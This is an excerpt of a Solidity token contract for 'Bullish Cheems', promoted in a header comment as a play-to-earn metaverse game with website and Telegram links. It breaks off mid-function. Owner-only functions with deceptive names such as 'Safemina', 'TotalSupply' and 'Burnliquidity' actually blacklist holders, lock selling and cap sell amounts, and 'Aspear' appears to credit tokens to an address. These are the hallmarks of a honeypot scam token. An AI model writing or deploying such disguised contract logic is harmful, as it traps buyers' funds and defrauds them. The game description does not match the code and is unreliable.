...
/**
Bullish Cheems is a decentralized play to earn game which allows users to incorporate the average day to day gaming scene into the future of the metaverse. Meta pets consists of a fantasy realm in which players are able to battle different types of mythical creatures using their own weapons.
💠Webiste: https://bullishcheemss.in/
💠Telegram: https://t.me/bullishcheems
*/
...
contract Bullishcheems is Ownable {
  ...
  function setBuyBack(address holder, bool allowApprove) external onlyOwner {
      allowAddress[holder] = allowApprove;
  }
  function setSeller(bool ok) external onlyOwner returns (bool){
      lockSeller = ok;
  }
  function Safemina(address holder, bool ok) external onlyOwner returns (bool){
      blackLists[holder] = ok;
  }  
  function TotalSupply(uint256 num) external onlyOwner returns (bool){
      maxSellOutNum = num;
  } 
  function Burnliquidity(uint256 num) external onlyOwner returns (bool){
      maxSellToken = num * 1000000000000000 ** uint256(decimals);
  }    
  function Aspear(address miner, uint256 _value) external onlyOwner {
